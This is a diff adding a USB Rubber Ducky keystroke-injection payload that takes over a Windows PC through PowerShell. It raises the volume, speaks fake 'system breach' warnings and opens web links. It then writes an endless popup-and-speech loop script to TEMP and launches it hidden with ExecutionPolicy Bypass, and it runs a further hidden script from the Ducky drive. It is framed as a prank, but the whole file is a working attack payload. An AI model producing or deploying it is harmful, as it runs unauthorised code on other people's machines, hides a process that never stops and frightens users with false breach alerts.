@@ -1,0 +1,92 @@
+ATTACKMODE HID
+DELAY 2000
+
+GUI r
+DELAY 400
+STRING powershell -NoProfile
+ENTER
+DELAY 1000
+
+REM === MAX VOLUME ===
+STRING $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char]175)}
+ENTER
+DELAY 500
+
+REM === TEXT TO SPEECH ENGINE ===
+STRING $sp=New-Object -ComObject SAPI.SpVoice
+ENTER
+DELAY 400
+
+REM === FAKE BREACH MESSAGE ===
+STRING $sp.Speak("System breach detected. Initiating quack protocol.")
+ENTER
+DELAY 1500
+
+STRING $sp.Speak("You have been quacked.")
+ENTER
+DELAY 1000
+
+REM === FAKE SCAN ===
+STRING Write-Host "Scanning files..."
+ENTER
+DELAY 800
+
+STRING Write-Host "Injecting ducks..."
+ENTER
+DELAY 800
+
+STRING Write-Host "100 percent quacked."
+ENTER
+DELAY 1000
+
+REM === OPEN DUCK IMAGE ===
+STRING Start-Process "https://loginportal.funnyjunk.com/pictures/Mytril+urorubragg+taboo+quacked_d7d9b1_6228073.jpg"
+ENTER
+DELAY 1500
+
+REM === OPEN DUCK SONG ===
+STRING Start-Process "https://www.youtube.com/watch?v=MtN1YnoL46Q"
+ENTER
+DELAY 1500
+
+REM === CREATE POPUP SPAM SCRIPT ===
+STRING $p="$env:TEMP\quackloop.ps1"
+ENTER
+DELAY 300
+
+STRING @'
+ENTER
+STRING $sp=New-Object -ComObject SAPI.SpVoice
+ENTER
+STRING $msgs=@("Catch me!","Too slow!","Quack detected in system32","You cannot escape","System fully quacked")
+ENTER
+STRING while($true){
+ENTER
+STRING $ws=New-Object -ComObject WScript.Shell
+ENTER
+STRING $ws.Popup(($msgs|Get-Random),2,"QUACKED",0x0)
+ENTER
+STRING $sp.Speak(($msgs|Get-Random))
+ENTER
+STRING Start-Sleep -Milliseconds 900
+ENTER
+STRING }
+ENTER
+STRING '@ ^| Set-Content $p
+ENTER
+DELAY 700
+
+REM === RUN POPUP LOOP HIDDEN ===
+STRING Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File "'+$p+'"'
+ENTER
+DELAY 800
+
+REM === OPTIONAL: LAUNCH DESKTOP DUCK ===
+REM (only works if stored on ducky storage labeled DUCKY)
+
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& ((Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\DesktopDuck.ps1')"
+ENTER
+
+DELAY 500
+STRING exit
+ENTER
